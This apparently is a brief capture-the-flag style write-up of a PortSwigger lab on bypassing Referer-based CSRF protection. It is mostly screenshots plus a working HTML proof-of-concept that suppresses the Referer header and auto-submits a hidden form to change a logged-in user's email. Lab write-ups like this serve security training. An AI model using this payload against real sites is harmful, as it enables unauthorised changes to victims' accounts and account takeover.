# CSRF where Referer validation depends on header being present

Lab URL :- `https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present`

![image](https://user-images.githubusercontent.com/60841283/182661299-0181fdf8-5f0e-4b8b-9105-3b2c29831efd.png)

Email update request :- 

![image](https://user-images.githubusercontent.com/60841283/182661391-8d300d17-6751-4b75-9734-8be73ecb5c92.png)

Changing Referer header :- 

![image](https://user-images.githubusercontent.com/60841283/182661865-6c29a82c-9d0f-427c-b236-4d9877f8ab5b.png)

Removing header :- 

![image](https://user-images.githubusercontent.com/60841283/182661990-66cfa8c4-1d20-4855-a241-02c9fe9eea8a.png)

Suppress header :- `https://stackoverflow.com/questions/6817595/remove-http-referer`

CSRF POC in exploit server :- 

```html
<html>
	<head>
		<meta name="referrer" content="no-referrer">
	</head>
	<body>
		<h1>CSRF POC</h1>
		<iframe style="display: none;" name="csrf-iframe"></iframe>
		<form action="https://0a2700d60302e214c050b88f007e002e.web-security-academy.net/my-account/change-email" method="post" id="csrf-id" target="csrf-iframe">
			<input type="hidden" name="email" value="lol@lol.com">
		</form>
		<script>document.getElementById("csrf-id").submit()</script>
	</body>
</html>
```

![image](https://user-images.githubusercontent.com/60841283/182662150-9267f459-87dd-4f61-8700-4030265cf006.png)
